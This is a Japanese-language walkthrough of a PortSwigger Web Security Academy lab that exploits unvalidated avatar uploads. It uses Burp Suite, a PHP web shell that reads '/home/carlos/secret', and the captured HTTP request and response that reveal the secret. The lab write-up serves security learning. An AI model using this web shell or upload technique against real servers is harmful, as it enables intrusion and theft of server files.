# Web シェルのアップロードによるリモート実行

以下のハッキングラボはファイルアップロード時に検証が行われない脆弱性があります。
https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

- 1.Burp Suite を起動し、Proxy タブからブラウザを立ち上げる
- 2.ブラウザからハッキングラボにアクセスする
- 3.一般ユーザーでログインするとアバター画像アップロードが可能なので、任意の画像をアップロードします
  ![2](https://github.com/pea-sys/web-security-experiments/assets/49807271/a0e02ada-2d9c-437b-918a-cd28f865174e)

- 4.Burp Suite の Http history にて images フィルタを設定します
  ![3](https://github.com/pea-sys/web-security-experiments/assets/49807271/a9216364-55e4-4703-94f9-e0f2734d78b4)

* 5.GET /files/avatars/1.png HTTP/2 リクエストを Send to repeater します

* 6.任意のシェルファイルを作成し、アバター画像アップロード機能でアップロードします

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- 7.repeater に送ったリクエストの指し示すファイル名を上記シェルに置き換えてリクエストを送信します

```
GET /files/avatars/test.php HTTP/2
Host: 0ab4000b0350b44b83795547008300e9.web-security-academy.net
Cookie: session=I6kKoEanDWZIbRIqUKGAC4iQW4XF0VDd
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0ab4000b0350b44b83795547008300e9.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

- 8.レスポンスから秘密の情報が得られました

```
HTTP/2 200 OK
Date: Sat, 05 Aug 2023 01:51:46 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

hzY0a7IhCYp3FkqZqx97vmoTDfkppkyl
```
